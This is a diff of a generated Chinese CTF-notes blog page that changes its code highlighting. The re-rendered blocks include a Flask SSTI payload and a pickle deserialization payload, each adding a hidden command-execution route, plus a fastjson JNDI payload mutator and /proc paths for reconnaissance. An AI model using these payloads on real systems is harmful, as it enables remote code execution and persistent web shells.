@@ -580,6 +580,21 @@
         
  <!-- prismjs 代码高亮 -->
  
+    
+    <link href="/js/prism/prism-line-numbers.css" rel="stylesheet">
+    
+        <link href="/js/prism/prism-coy.min.css" rel="stylesheet">
+    
+
+    <style>
+        pre[class*="language-"] {
+            overflow-y: hidden;
+        }
+        .line-numbers .line-numbers-rows {
+            border: none;
+        }
+    </style>
+  
 
 
 <div class="bg-dark-floor" style="position: fixed;left: 0;top: 0;width: 100%;height: 100%;z-index: -1;"></div>
@@ -655,9 +670,22 @@
 <p>TiedMapEntry.toString -&gt; getValue -&gt; get (CC5)</p>
 <h3 id="jwt"><a href="#jwt" class="headerlink" title="jwt"></a>jwt</h3><p>一般jwt直接破解不了的，考虑原型链污染key。一般jwt考题都伴随了原型链污染</p>
 <h3 id="hessian"><a href="#hessian" class="headerlink" title="hessian"></a>hessian</h3><p>hessian打TemplatesImpl不能readObject初始化tfactory，直接SignedObject-&gt;TemplatesImpl</p>
-<h3 id="无回显问题"><a href="#无回显问题" class="headerlink" title="无回显问题"></a>无回显问题</h3><h4 id="flask-SSTI无回显"><a href="#flask-SSTI无回显" class="headerlink" title="flask SSTI无回显"></a>flask SSTI无回显</h4><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;a.__init__.__globals__[%27__builtins__%27][%27eval%27](%22app.add_url_rule(%27/shell3%27,%20%27shell2%27,%20lambda%20:__import__(%27os%27).popen(_request_ctx_stack.top.request.args.get(%27cmd%27,%20%27ls%20/%27)).read())%22,&#123;%27_request_ctx_stack%27:url_for.__globals__[%27_request_ctx_stack%27],%27app%27:url_for.__globals__[%27current_app%27]&#125;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="无回显问题"><a href="#无回显问题" class="headerlink" title="无回显问题"></a>无回显问题</h3><h4 id="flask-SSTI无回显"><a href="#flask-SSTI无回显" class="headerlink" title="flask SSTI无回显"></a>flask SSTI无回显</h4><pre class="line-numbers language-http" data-language="http"><code class="language-http">&#123;&#123;a.__init__.__globals__[%27__builtins__%27][%27eval%27](%22app.add_url_rule(%27/shell3%27,%20%27shell2%27,%20lambda%20:__import__(%27os%27).popen(_request_ctx_stack.top.request.args.get(%27cmd%27,%20%27ls%20/%27)).read())%22,&#123;%27_request_ctx_stack%27:url_for.__globals__[%27_request_ctx_stack%27],%27app%27:url_for.__globals__[%27current_app%27]&#125;)&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<h3 id="pickle不出网无回显"><a href="#pickle不出网无回显" class="headerlink" title="pickle不出网无回显"></a>pickle不出网无回显</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">genpoc</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        s = <span class="string">&quot;&quot;&quot;import sys</span></span><br><span class="line"><span class="string">sys.modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].debug=False</span></span><br><span class="line"><span class="string">sys.modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].add_url_rule(&#x27;/shell1&#x27;,&#x27;shell1&#x27;,lambda :__import__(&#x27;os&#x27;).popen(&#x27;ls /&#x27;).read())&quot;&quot;&quot;</span>  <span class="comment"># 要执行的命令</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">exec</span>, (s,)        <span class="comment"># reduce函数必须返回元组或字符串</span></span><br><span class="line"></span><br><span class="line">e = genpoc()</span><br><span class="line">poc = pickle.dumps(e)</span><br><span class="line">basepoc = base64.b64encode(poc)</span><br><span class="line"><span class="built_in">print</span>(basepoc)</span><br></pre></td></tr></table></figure>
+<h3 id="pickle不出网无回显"><a href="#pickle不出网无回显" class="headerlink" title="pickle不出网无回显"></a>pickle不出网无回显</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64
+<span class="token keyword">import</span> pickle
+
+<span class="token keyword">class</span> <span class="token class-name">genpoc</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        s <span class="token operator">=</span> <span class="token triple-quoted-string string">"""import sys
+sys.modules['__main__'].__dict__['app'].debug=False
+sys.modules['__main__'].__dict__['app'].add_url_rule('/shell1','shell1',lambda :__import__('os').popen('ls /').read())"""</span>  <span class="token comment"># 要执行的命令</span>
+        <span class="token keyword">return</span> <span class="token keyword">exec</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>s<span class="token punctuation">,</span><span class="token punctuation">)</span>        <span class="token comment"># reduce函数必须返回元组或字符串</span>
+
+e <span class="token operator">=</span> genpoc<span class="token punctuation">(</span><span class="token punctuation">)</span>
+poc <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>e<span class="token punctuation">)</span>
+basepoc <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>poc<span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>basepoc<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 
 
@@ -679,7 +707,7 @@
 <li>安装 2.11.3版本（目前已知该版本有‘Markup’模块）<br><code>pip install jinja2==2.11.3</code></li>
 <li>然后报’soft_unicode’ from ‘markupsafe’</li>
 </ol>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m pip install markupsafe==2.0.1</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python <span class="token parameter variable">-m</span> pip <span class="token function">install</span> <span class="token assign-left variable">markupsafe</span><span class="token operator">==</span><span class="token number">2.0</span>.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <ol start="4">
 <li>报import name ‘url_quote’ from ‘werkzeug.urls’</li>
@@ -695,22 +723,24 @@
 <h3 id="fenjing安装问题"><a href="#fenjing安装问题" class="headerlink" title="fenjing安装问题"></a>fenjing安装问题</h3><ul>
 <li>jinja ssti 神器 fenjing安装：</li>
 </ul>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pipx install fenjing</span><br><span class="line">pipx run fenjing webui</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pipx <span class="token function">install</span> fenjing
+pipx run fenjing webui<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <p>python创建虚拟环境后（pycharm能创建虚拟venv），在 venv\Scripts\目录下使用activate进入虚拟环境命令行，pip下载虚拟环境依赖包。(注意pip时关掉代理，清华源屏蔽国外流量)</p>
 <h3 id="nodejs原型链污染无效问题"><a href="#nodejs原型链污染无效问题" class="headerlink" title="nodejs原型链污染无效问题"></a>nodejs原型链污染无效问题</h3><p>nodejs原型链污染记得改Content-Type为application&#x2F;json</p>
 <p>nodejs有原型链污染，python也有</p>
 <h3 id="procS-ctf常用文件信息"><a href="#procS-ctf常用文件信息" class="headerlink" title="procS ctf常用文件信息"></a>procS ctf常用文件信息</h3><p>进行内网探测时可以读取</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/proc/net/arp</span><br><span class="line">/etc/host</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">&#x2F;proc&#x2F;net&#x2F;arp
+&#x2F;etc&#x2F;host<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <p>proc&#x2F;进程号&#x2F;cmline存储着启动当前程序的命令</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/proc/2889/cmdline</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">&#x2F;proc&#x2F;2889&#x2F;cmdline<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>cwd文件存储了当前进程环境的运行目录</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/proc/1289/cwd</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">&#x2F;proc&#x2F;1289&#x2F;cwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>proc&#x2F;self表示当前进程目录。等同于&#x2F;proc&#x2F;本进程id。所以获取当前进程命令也可以用</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/proc/self/cmdline</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">&#x2F;proc&#x2F;self&#x2F;cmdline<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 
 
@@ -736,7 +766,102 @@
 </li>
 </ul>
 <p>一个fuzzing fastjson的脚本</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> json <span class="keyword">import</span> JSONDecodeError</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FastJsonPayload</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, base_payload</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            json.loads(base_payload)</span><br><span class="line">        <span class="keyword">except</span> JSONDecodeError <span class="keyword">as</span> ex:</span><br><span class="line">            <span class="keyword">raise</span> ex</span><br><span class="line">        self.base_payload = base_payload</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">gen_common</span>(<span class="params">self, payload, func</span>):</span><br><span class="line">        tmp_payload = json.loads(payload)</span><br><span class="line">        dct_objs = [tmp_payload]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> <span class="built_in">len</span>(dct_objs) &gt; <span class="number">0</span>:</span><br><span class="line">            tmp_objs = []</span><br><span class="line">            <span class="keyword">for</span> dct_obj <span class="keyword">in</span> dct_objs:</span><br><span class="line">                <span class="keyword">for</span> key <span class="keyword">in</span> dct_obj:</span><br><span class="line">                    <span class="keyword">if</span> key == <span class="string">&quot;@type&quot;</span>:</span><br><span class="line">                        dct_obj[key] = func(dct_obj[key])</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">type</span>(dct_obj[key]) == <span class="built_in">dict</span>:</span><br><span class="line">                        tmp_objs.append(dct_obj[key])</span><br><span class="line">            dct_objs = tmp_objs</span><br><span class="line">        <span class="keyword">return</span> json.dumps(tmp_payload)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 对@type的value增加L开头，;结尾的payload</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">gen_payload1</span>(<span class="params">self, payload: <span class="built_in">str</span></span>):</span><br><span class="line">        <span class="keyword">return</span> self.gen_common(payload, <span class="keyword">lambda</span> v: <span class="string">&quot;L&quot;</span> + v + <span class="string">&quot;;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 对@type的value增加LL开头，;;结尾的payload</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">gen_payload2</span>(<span class="params">self, payload: <span class="built_in">str</span></span>):</span><br><span class="line">        <span class="keyword">return</span> self.gen_common(payload, <span class="keyword">lambda</span> v: <span class="string">&quot;LL&quot;</span> + v + <span class="string">&quot;;;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 对@type的value进行\u</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">gen_payload3</span>(<span class="params">self, payload: <span class="built_in">str</span></span>):</span><br><span class="line">        <span class="keyword">return</span> self.gen_common(payload,</span><br><span class="line">                               <span class="keyword">lambda</span> v: <span class="string">&#x27;&#x27;</span>.join(<span class="string">&#x27;\\u&#123;:04x&#125;&#x27;</span>.<span class="built_in">format</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> v.encode())).replace(<span class="string">&quot;\\\\&quot;</span>, <span class="string">&quot;\\&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 对@type的value进行\x</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">gen_payload4</span>(<span class="params">self, payload: <span class="built_in">str</span></span>):</span><br><span class="line">        <span class="keyword">return</span> self.gen_common(payload,</span><br><span class="line">                               <span class="keyword">lambda</span> v: <span class="string">&#x27;&#x27;</span>.join(<span class="string">&#x27;\\x&#123;:02x&#125;&#x27;</span>.<span class="built_in">format</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> v.encode())).replace(<span class="string">&quot;\\\\&quot;</span>, <span class="string">&quot;\\&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 生成cache绕过payload</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">gen_payload5</span>(<span class="params">self, payload: <span class="built_in">str</span></span>):</span><br><span class="line">        cache_payload = &#123;</span><br><span class="line">            <span class="string">&quot;rand1&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Class&quot;</span>,</span><br><span class="line">                <span class="string">&quot;val&quot;</span>: <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        cache_payload[<span class="string">&quot;rand2&quot;</span>] = json.loads(payload)</span><br><span class="line">        <span class="keyword">return</span> json.dumps(cache_payload)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">gen</span>(<span class="params">self</span>):</span><br><span class="line">        payloads = []</span><br><span class="line"></span><br><span class="line">        payload1 = self.gen_payload1(self.base_payload)</span><br><span class="line">        <span class="keyword">yield</span> payload1</span><br><span class="line"></span><br><span class="line">        payload2 = self.gen_payload2(self.base_payload)</span><br><span class="line">        <span class="keyword">yield</span> payload2</span><br><span class="line"></span><br><span class="line">        payload3 = self.gen_payload3(self.base_payload)</span><br><span class="line">        <span class="keyword">yield</span> payload3</span><br><span class="line"></span><br><span class="line">        payload4 = self.gen_payload4(self.base_payload)</span><br><span class="line">        <span class="keyword">yield</span> payload4</span><br><span class="line"></span><br><span class="line">        payload5 = self.gen_payload5(self.base_payload)</span><br><span class="line">        <span class="keyword">yield</span> payload5</span><br><span class="line"></span><br><span class="line">        payloads.append(payload1)</span><br><span class="line">        payloads.append(payload2)</span><br><span class="line">        payloads.append(payload5)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> payload <span class="keyword">in</span> payloads:</span><br><span class="line">            <span class="keyword">yield</span> self.gen_payload3(payload)</span><br><span class="line">            <span class="keyword">yield</span> self.gen_payload4(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    fjp = FastJsonPayload(<span class="string">&#x27;&#x27;&#x27;&#123;</span></span><br><span class="line"><span class="string">  &quot;rand1&quot;: &#123;</span></span><br><span class="line"><span class="string">    &quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span></span><br><span class="line"><span class="string">    &quot;dataSourceName&quot;: &quot;ldap://localhost:1389/Object&quot;,</span></span><br><span class="line"><span class="string">    &quot;autoCommit&quot;: true</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">&#125;&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> payload <span class="keyword">in</span> fjp.gen():</span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        <span class="built_in">print</span>()</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> json
+<span class="token keyword">from</span> json <span class="token keyword">import</span> JSONDecodeError
+
+
+<span class="token keyword">class</span> <span class="token class-name">FastJsonPayload</span><span class="token punctuation">:</span>
+    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> base_payload<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">try</span><span class="token punctuation">:</span>
+            json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>base_payload<span class="token punctuation">)</span>
+        <span class="token keyword">except</span> JSONDecodeError <span class="token keyword">as</span> ex<span class="token punctuation">:</span>
+            <span class="token keyword">raise</span> ex
+        self<span class="token punctuation">.</span>base_payload <span class="token operator">=</span> base_payload
+
+    <span class="token keyword">def</span> <span class="token function">gen_common</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> payload<span class="token punctuation">,</span> func<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        tmp_payload <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+        dct_objs <span class="token operator">=</span> <span class="token punctuation">[</span>tmp_payload<span class="token punctuation">]</span>
+
+        <span class="token keyword">while</span> <span class="token builtin">len</span><span class="token punctuation">(</span>dct_objs<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>
+            tmp_objs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+            <span class="token keyword">for</span> dct_obj <span class="token keyword">in</span> dct_objs<span class="token punctuation">:</span>
+                <span class="token keyword">for</span> key <span class="token keyword">in</span> dct_obj<span class="token punctuation">:</span>
+                    <span class="token keyword">if</span> key <span class="token operator">==</span> <span class="token string">"@type"</span><span class="token punctuation">:</span>
+                        dct_obj<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> func<span class="token punctuation">(</span>dct_obj<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">)</span>
+
+                    <span class="token keyword">if</span> <span class="token builtin">type</span><span class="token punctuation">(</span>dct_obj<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">dict</span><span class="token punctuation">:</span>
+                        tmp_objs<span class="token punctuation">.</span>append<span class="token punctuation">(</span>dct_obj<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">)</span>
+            dct_objs <span class="token operator">=</span> tmp_objs
+        <span class="token keyword">return</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>tmp_payload<span class="token punctuation">)</span>
+
+    <span class="token comment"># 对@type的value增加L开头，;结尾的payload</span>
+    <span class="token keyword">def</span> <span class="token function">gen_payload1</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> payload<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> self<span class="token punctuation">.</span>gen_common<span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token keyword">lambda</span> v<span class="token punctuation">:</span> <span class="token string">"L"</span> <span class="token operator">+</span> v <span class="token operator">+</span> <span class="token string">";"</span><span class="token punctuation">)</span>
+
+    <span class="token comment"># 对@type的value增加LL开头，;;结尾的payload</span>
+    <span class="token keyword">def</span> <span class="token function">gen_payload2</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> payload<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> self<span class="token punctuation">.</span>gen_common<span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token keyword">lambda</span> v<span class="token punctuation">:</span> <span class="token string">"LL"</span> <span class="token operator">+</span> v <span class="token operator">+</span> <span class="token string">";;"</span><span class="token punctuation">)</span>
+
+    <span class="token comment"># 对@type的value进行\u</span>
+    <span class="token keyword">def</span> <span class="token function">gen_payload3</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> payload<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> self<span class="token punctuation">.</span>gen_common<span class="token punctuation">(</span>payload<span class="token punctuation">,</span>
+                               <span class="token keyword">lambda</span> v<span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string">'\\u&#123;:04x&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> v<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\\\\"</span><span class="token punctuation">,</span> <span class="token string">"\\"</span><span class="token punctuation">)</span>
+
+    <span class="token comment"># 对@type的value进行\x</span>
+    <span class="token keyword">def</span> <span class="token function">gen_payload4</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> payload<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> self<span class="token punctuation">.</span>gen_common<span class="token punctuation">(</span>payload<span class="token punctuation">,</span>
+                               <span class="token keyword">lambda</span> v<span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string">'\\x&#123;:02x&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> v<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\\\\"</span><span class="token punctuation">,</span> <span class="token string">"\\"</span><span class="token punctuation">)</span>
+
+    <span class="token comment"># 生成cache绕过payload</span>
+    <span class="token keyword">def</span> <span class="token function">gen_payload5</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> payload<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        cache_payload <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+            <span class="token string">"rand1"</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span>
+                <span class="token string">"@type"</span><span class="token punctuation">:</span> <span class="token string">"java.lang.Class"</span><span class="token punctuation">,</span>
+                <span class="token string">"val"</span><span class="token punctuation">:</span> <span class="token string">"com.sun.rowset.JdbcRowSetImpl"</span>
+            <span class="token punctuation">&#125;</span>
+        <span class="token punctuation">&#125;</span>
+        cache_payload<span class="token punctuation">[</span><span class="token string">"rand2"</span><span class="token punctuation">]</span> <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+        <span class="token keyword">return</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>cache_payload<span class="token punctuation">)</span>
+
+    <span class="token keyword">def</span> <span class="token function">gen</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        payloads <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+
+        payload1 <span class="token operator">=</span> self<span class="token punctuation">.</span>gen_payload1<span class="token punctuation">(</span>self<span class="token punctuation">.</span>base_payload<span class="token punctuation">)</span>
+        <span class="token keyword">yield</span> payload1
+
+        payload2 <span class="token operator">=</span> self<span class="token punctuation">.</span>gen_payload2<span class="token punctuation">(</span>self<span class="token punctuation">.</span>base_payload<span class="token punctuation">)</span>
+        <span class="token keyword">yield</span> payload2
+
+        payload3 <span class="token operator">=</span> self<span class="token punctuation">.</span>gen_payload3<span class="token punctuation">(</span>self<span class="token punctuation">.</span>base_payload<span class="token punctuation">)</span>
+        <span class="token keyword">yield</span> payload3
+
+        payload4 <span class="token operator">=</span> self<span class="token punctuation">.</span>gen_payload4<span class="token punctuation">(</span>self<span class="token punctuation">.</span>base_payload<span class="token punctuation">)</span>
+        <span class="token keyword">yield</span> payload4
+
+        payload5 <span class="token operator">=</span> self<span class="token punctuation">.</span>gen_payload5<span class="token punctuation">(</span>self<span class="token punctuation">.</span>base_payload<span class="token punctuation">)</span>
+        <span class="token keyword">yield</span> payload5
+
+        payloads<span class="token punctuation">.</span>append<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>
+        payloads<span class="token punctuation">.</span>append<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>
+        payloads<span class="token punctuation">.</span>append<span class="token punctuation">(</span>payload5<span class="token punctuation">)</span>
+
+        <span class="token keyword">for</span> payload <span class="token keyword">in</span> payloads<span class="token punctuation">:</span>
+            <span class="token keyword">yield</span> self<span class="token punctuation">.</span>gen_payload3<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+            <span class="token keyword">yield</span> self<span class="token punctuation">.</span>gen_payload4<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
+    fjp <span class="token operator">=</span> FastJsonPayload<span class="token punctuation">(</span><span class="token triple-quoted-string string">'''&#123;
+  "rand1": &#123;
+    "@type": "com.sun.rowset.JdbcRowSetImpl",
+    "dataSourceName": "ldap://localhost:1389/Object",
+    "autoCommit": true
+  &#125;
+&#125;'''</span><span class="token punctuation">)</span>
+
+    <span class="token keyword">for</span> payload <span class="token keyword">in</span> fjp<span class="token punctuation">.</span>gen<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 
 
@@ -792,7 +917,8 @@
       </div>
       
       <!-- <div class="content">
